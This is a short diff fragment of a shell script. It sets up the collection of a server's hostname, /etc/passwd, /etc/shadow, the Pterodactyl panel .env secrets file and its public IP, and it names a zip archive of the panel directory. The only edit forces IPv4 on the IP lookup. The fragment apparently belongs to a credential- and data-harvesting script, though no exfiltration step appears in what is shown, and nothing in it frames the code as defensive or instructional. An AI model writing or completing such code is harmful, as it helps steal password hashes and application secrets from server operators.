@@ -11,7 +11,7 @@ RESULT1="$(cat /etc/hostname)"
 FILE1="/etc/passwd"
 FILE2="/etc/shadow"
 FILE3="/var/www/pterodactyl/.env"
-RESULT2="$(curl -s ifconfig.me)"
+RESULT2="$(curl -4 -s ifconfig.me)"
 SRC="/var/www/pterodactyl"
 ZIP="/etc/ptero.zip"
 
